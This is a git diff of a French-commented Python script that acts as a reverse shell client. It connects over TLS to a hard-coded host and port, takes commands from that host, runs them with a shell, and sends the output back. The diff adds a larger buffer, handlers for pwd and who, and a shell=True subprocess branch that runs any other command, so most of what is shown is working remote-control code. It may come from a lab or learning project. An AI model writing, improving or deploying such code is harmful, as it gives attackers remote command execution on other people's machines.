@@ -12,12 +12,11 @@ import ssl
 import subprocess
 import os
 
-def send(data):
-    wrappedSocket.sendall(data.encode()) 
-
 # /!\ MODIFIER @ HOST AVANT D'EXECUTER LE PROGRAMME
 HOST = '192.168.1.6'
 PORT = 25566
+# taille des messages : 128kB
+BUFFER_SIZE = 1024 * 128
 
 # Create a TCP/IP socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -33,20 +32,39 @@ wrappedSocket = context.wrap_socket(sock, server_hostname=HOST)
 wrappedSocket.connect((HOST, PORT))
 
 try:
-   while wrappedSocket:
-        received_data = wrappedSocket.recv(1024)
+   while True:
+        received_data = wrappedSocket.recv(BUFFER_SIZE)
         # Send the output of the command over the SSL connection
         # Execute a system command
 
         cmd = received_data.decode().split()
-        print(cmd)
-        #received_data = 0
         # la commande a-t-elle des paramètres ?
         if cmd[0] == "cd" or cmd[0] == "CD":
             os.chdir(cmd[1])
             # à supprimer (debug)
             output = "Changed directory to {}".format(os.getcwd())
-            send(output)
+            wrappedSocket.sendall(output.encode())
+        elif cmd[0] == "pwd":
+            output = os.getcwd()
+            wrappedSocket.sendall(output.encode()) 
+        elif cmd[0] == "cp":
+            wrappedSocket.sendall(cmd[0].encode())
+        elif cmd[0] == "rm":
+            wrappedSocket.sendall(cmd[0].encode())
+        elif cmd[0] == "who":
+            output = os.environ.get('USERNAME')
+            wrappedSocket.sendall(output.encode())
+        else:
+            command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
+                                    stderr=subprocess.PIPE)
+            output, err = command.communicate()
+            if output:
+                wrappedSocket.sendall(output) 
+            elif err:
+                wrappedSocket.sendall(err)
+            else:
+                wrappedSocket.sendall("[-] Error: couldn't send data".encode())
+        """
         elif cmd[0] == "cp" or cmd[0] == "CP":
             send(cmd)
         elif cmd[0] == "rm" or cmd[0] == "RM":
@@ -61,21 +79,7 @@ try:
             wrappedSocket.shutdown(socket.SHUT_RDWR)
             wrappedSocket.close()
             exit(0)
-        if cmd[0] == "pwd":
-            output = os.getcwd()
-            send(output)
-        if cmd[0] == "help":
-            print(cmd)
-        else:
-            command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
-                                    stderr=subprocess.PIPE)
-            output, err = command.communicate(timeout=60)
-            if not err:
-                send(output)
-            elif not output:
-                send(err)
-            else:
-                send("[-] Error: couldn't send data")
+        """
 except Exception:
     exit(-1)
 finally:
